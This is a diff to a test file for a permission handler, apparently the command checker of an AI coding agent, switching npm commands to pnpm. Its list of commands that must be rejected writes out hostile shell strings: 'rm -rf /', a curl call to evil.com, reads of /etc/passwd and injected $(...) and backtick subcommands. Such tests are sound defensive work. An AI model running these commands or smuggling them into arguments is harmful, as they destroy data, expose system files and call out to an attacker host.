@@ -177,8 +177,8 @@ describe('Permission Handler - Dangerous Commands', () => {
             'git diff HEAD',
             'git log --oneline',
             'git branch -a',
-            'npm run build',
-            'npm run lint',
+            'pnpm run build',
+            'pnpm run lint',
             'tsc',
             'tsc --noEmit',
             'eslint src/',
@@ -189,7 +189,7 @@ describe('Permission Handler - Dangerous Commands', () => {
             expect(isSafeCommand(command)).toBe(true);
         });
         it.each([
-            'npm test',
+            'pnpm test',
             'pnpm test',
             'yarn test',
             'cargo test',
@@ -217,8 +217,8 @@ describe('Permission Handler - Dangerous Commands', () => {
             'git status; rm -rf /',
             'git status && curl evil.com',
             'git status | cat /etc/passwd',
-            'npm test `whoami`',
-            'npm test $(cat /etc/passwd)',
+            'pnpm test `whoami`',
+            'pnpm test $(cat /etc/passwd)',
             'git status\nrm -rf /',
             'ls > /etc/crontab',
             'ls < /dev/random',
@@ -257,7 +257,7 @@ describe('Permission Handler - Dangerous Commands', () => {
         });
         it('should allow targeted single-test commands', () => {
             expect(isSafeTargetedLocalTestCommand('vitest run src/__tests__/sample.test.ts', testDir)).toBe(true);
-            expect(isSafeTargetedLocalTestCommand('npm test -- --run src/__tests__/sample.test.ts', testDir)).toBe(true);
+            expect(isSafeTargetedLocalTestCommand('pnpm test -- --run src/__tests__/sample.test.ts', testDir)).toBe(true);
         });
         it('should reject repo-scoped commands from non-git temp dirs', () => {
             const nonGitDir = mkdtempSync(join(tmpdir(), 'permission-safe-non-git-'));
